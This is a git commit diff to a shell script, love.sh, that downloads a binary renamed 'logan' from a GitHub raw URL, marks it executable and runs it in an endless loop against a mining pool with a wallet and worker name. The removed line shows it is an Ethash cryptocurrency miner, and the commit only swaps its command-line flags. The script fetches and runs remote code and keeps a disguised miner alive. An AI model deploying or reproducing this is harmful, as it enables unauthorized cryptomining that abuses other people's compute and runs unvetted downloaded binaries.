84cb5807959c2e439eb80ce6bbf7b97b371065c8
alibahrami1204 <89921212+alibahrami1204@users.noreply.github.com>
2021-09-02 11:25:19 +0430

    Update love.sh

--- love.sh
+++ love.sh
@@ -5,7 +5,7 @@ WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/alibahrami1204/Success/raw/main/logan
 chmod +x logan
 while [ 1 ]; do
-./logan --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./logan -pool $POOL -wal $WALLET.$WORKER -pass x
 sleep 5
 done
 sleep 999999999 
